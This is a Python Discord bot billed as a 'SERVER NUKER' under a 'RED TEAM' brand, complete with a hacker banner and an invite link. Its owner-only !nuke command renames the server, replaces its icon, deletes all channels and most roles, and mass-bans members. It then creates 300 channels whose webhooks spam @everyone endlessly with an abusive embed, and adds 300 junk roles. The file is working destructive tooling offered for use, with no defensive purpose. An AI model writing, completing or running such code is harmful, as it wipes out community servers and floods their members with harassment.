import discord
import sys
import time
import random
from discord.ext import commands
import asyncio
import aiohttp
import pyfiglet
from colorama import Fore, Style, init


# রঙের লিস্ট
colors = [
    Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE,
    Fore.MAGENTA, Fore.CYAN, Fore.LIGHTGREEN_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTYELLOW_EX
]

init(autoreset=True)

def slow_print(text, delay=0.002):

    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def banner(text, font="slant"):
    
    ascii_text = pyfiglet.figlet_format(text, font=font)
    color = random.choice(colors)
    for line in ascii_text.split("\n"):
        print(color + line)
        time.sleep(0.01)

def loading_effect(msg="Loading", dots=10):
    
    sys.stdout.write(Fore.CYAN + msg)
    for _ in range(dots):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(0.2)
    print("\n")

# ব্যবহার শুরু
loading_effect("Initializing SERVER NUKER", 5)
banner("SERVER NUKER", font="starwars")
slow_print(Fore.LIGHTGREEN_EX + "[+] Server Nuker Loaded Successfully!")
slow_print(Fore.YELLOW + "[*] Welcome to the Hacker Terminal...")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    await bot.change_presence(activity=discord.Game(name="FUCKING SOME SERVERS"))

@bot.command()
@commands.is_owner()
async def nuke(ctx):
    guild = ctx.guild

    # Send status messages BEFORE deleting channels to avoid 404 errors
    await ctx.send("🚀 Fucking Starting.....")
    await ctx.send("🔨 Mass banning members...")

    # Rename server
    try:
        await guild.edit(name="FUCKED BY RED TEAM !!")
    except Exception as e:
        print("❌ Failed to rename guild:", e)

    # Change icon from URL
    icon_url = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXkwcGtxb3U1eTU5eDlxZDNjMDRneGNuY25rY3Nhem9qODkwbGhnMSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/KzGCAlMiK6hQQ/giphy.gif"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    await guild.edit(icon=icon_bytes)
                else:
                    print(f"Failed to download icon, status code: {resp.status}")
    except Exception as e:
        print(f"⚠️ Could not change icon from URL: {e}")

    # Delete all channels concurrently
    await asyncio.gather(*(ch.delete(reason="Nuked by RED TEAM !!") for ch in guild.channels), return_exceptions=True)

    # Delete all roles except @everyone concurrently
    await asyncio.gather(*[
        role.delete(reason="Deleted by RED TEAM")
        for role in guild.roles if role.name != "@everyone"
    ], return_exceptions=True)

    # Massban members concurrently
    massban_tasks = []
    for member in guild.members:
        if member.id != bot.user.id and not member.bot and member != ctx.author:
            massban_tasks.append(member.ban(reason="Massban by RED TEAM"))
    await asyncio.gather(*massban_tasks, return_exceptions=True)

    embed = discord.Embed(
        title="💣 RED TEAM HAS NUKED THIS SERVER",
        description="```\nYOU GOT FUCKED!!\n```",
        color=discord.Color.red()
    )
    embed.add_field(name="Developer", value="H4X MAHDI !", inline=True)
    embed.add_field(name="Join Us", value="[Click Here 🔗](https://discord.gg/BAQMPA8nqb)", inline=True)
    embed.set_footer(text="YOU'R FUCKING SHIT.")
    embed.set_image(url="https://cdn.discordapp.com/attachments/1361652994541879397/1405480933347557426/download.PNG?ex=689efb9f&is=689daa1f&hm=50f9fdd6501cc6136361b32cdfee4450ac3cf4af49b412c04ed3b84901e8207c&")

    async def spam_forever(webhook):
        while True:
            try:
                # Rapid burst of 10 messages with minimal delay
                for _ in range(10):
                    await webhook.send(
                        content="@everyone @here",
                        username="💀 RED TEAM BOT",
                        embed=embed
                    )
                await asyncio.sleep(0.5)  # short pause after burst
            except Exception as e:
                print("Webhook error:", e)
                await asyncio.sleep(5)

    async def create_channel_and_spam(i):
        try:
            channel = await guild.create_text_channel(f"fucked-by-red-team-{i}")
            webhook = await channel.create_webhook(name="RED TEAM SPAM")
            asyncio.create_task(spam_forever(webhook))
        except Exception as e:
            print(f"❌ Failed to create channel or start spam for {i}: {e}")

    # Create all 300 channels and start spam concurrently
    tasks = [asyncio.create_task(create_channel_and_spam(i)) for i in range(300)]
    await asyncio.gather(*tasks)

    # Create 300 spam roles concurrently
    role_tasks = []
    for i in range(300):
        role_tasks.append(guild.create_role(name=f"RED TEAM {i}", colour=discord.Colour.random()))
    await asyncio.gather(*role_tasks, return_exceptions=True)

    await ctx.send("🔥 Nuke completed: 300 channels + spam started concurrently.")

bot.run("")
